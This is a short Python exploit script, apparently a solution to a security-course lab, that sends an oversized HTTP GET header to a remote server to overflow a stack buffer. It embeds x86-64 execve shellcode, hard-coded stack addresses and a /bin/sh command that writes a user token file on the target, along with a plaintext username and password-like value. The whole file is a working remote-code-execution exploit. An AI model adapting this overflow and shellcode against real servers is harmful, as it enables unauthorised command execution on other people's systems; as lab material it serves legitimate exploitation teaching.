import socket
import random

def to_bytes(i, l=8):
    return int.to_bytes(i, length=l, byteorder='little')

# Method should always be get
METHOD = b"GET"

# We don't care what URL we're grabbing; they all have the possibility of exploit...
URL = b"/"

PORT = random.randint(10000, 10025)

USER = b"kmcgraw"
PASSWORD = b"e6c6015f86"

SCRIPT = [b"/bin/sh\x00", b"-c\x00", b"echo -n " + USER + b" | sha384sum > /hackme/tiny/tokens/" + PASSWORD + b"\x00"]

ADDRESS = to_bytes(0x58585590 + len(SCRIPT[0]) + len(SCRIPT[1]) + len(SCRIPT[2]) + 32)
ADDRESS1 = to_bytes(0x58585590)
ADDRESS2 = to_bytes(0x58585590 + len(SCRIPT[0]))
ADDRESS3 = to_bytes(0x58585590 + len(SCRIPT[0]) + len(SCRIPT[1]))
ADDRESS4 = to_bytes(0)

CODE = b"\x48\xc7\xc0\x3b\x00\x00\x00\x48\xc7\xc7\x90\x55\x58\x58\x48\xc7\xc6\xd8\x55\x58\x58\x48\xc7\xc2\xf0\x55\x58\x58\x0f\x05"

N = 1008 - len(CODE) - len(SCRIPT[0]) - len(SCRIPT[1]) - len(SCRIPT[2]) - len(ADDRESS1) - len(ADDRESS2) - len(ADDRESS3) - len(ADDRESS4)
PADDING = SCRIPT[0] + SCRIPT[1] + SCRIPT[2] + ADDRESS1 + ADDRESS2 + ADDRESS3 + ADDRESS4 + CODE + b"\xff" * N

HEADERS = PADDING + ADDRESS

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("adventure.com.puter.systems", PORT))
request = METHOD + b" " + URL + b" " + b"HTTP/1.1\r\n" + HEADERS + b"\r\nConnection: close\r\n\r\n" + PASSWORD
print(request)
client.send(request)
response = client.recv(4096)
print(response.decode())
